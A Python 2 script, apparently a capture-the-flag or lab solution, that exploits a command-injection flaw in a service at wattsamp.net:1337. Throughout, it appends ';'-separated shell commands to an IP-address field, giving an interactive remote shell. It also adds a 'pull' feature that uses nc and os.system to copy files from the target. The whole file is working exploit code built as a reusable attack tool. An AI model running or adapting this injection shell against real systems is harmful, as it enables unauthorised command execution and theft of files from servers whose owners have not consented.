import socket
import os

host = "wattsamp.net"
port = 1337

def help_message():
    print("POSSIBLE COMMANDS~~~")
    print("shell: create an interactive shell")
    print("pull <remote-path> <local-path>: download files")
    print("help: shows this help menu")
    print("quit: quit the shell")

def execute_cmd(cmd, pwd):
    # change directory
    if cmd.split()[0] == "cd":
        if len(cmd.split()) == 2:
            if cmd.split()[1][0] == "/":
                pwd = cmd.split()[1]
            else:
                pwd += cmd.split()[1]
        elif len(cmd.split()) == 1:
            pwd = "/"
        else:
            help_message()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)

    s.send("157.230.179.99; cd " + pwd + "; " + cmd + "\n")

    data = s.recv(1024)
    print(data)

    return pwd

def run_shell():
    pwd = "/"
    cmd = raw_input(pwd + "> ")

    while cmd != "quit" and cmd != "exit":
        # print help message
        if cmd.split()[0] == "help":
            if len(cmd.split()) != 1:
                print("help does not take any commands")

            help_message()

        # copy file onto local machine
        elif cmd.split()[0] == "pull":
            if len(cmd.split()) == 3:
                remote_path = cmd.split()[1]
                local_path = cmd.split()[2]

                attack = "echo \"157.230.179.99; cd " + pwd + "; cat " + remote_path + "\" | nc wattsamp.net 1337 >> " + local_path

                os.system(attack)

            else:
                help_message()

        # run any other command
        else:
            pwd = execute_cmd(cmd, pwd)

        cmd = raw_input(pwd + "> ")

if __name__ == '__main__':
    print("(hint: type shell)")
    inp = raw_input("> ")

    if inp == "shell":
        run_shell()
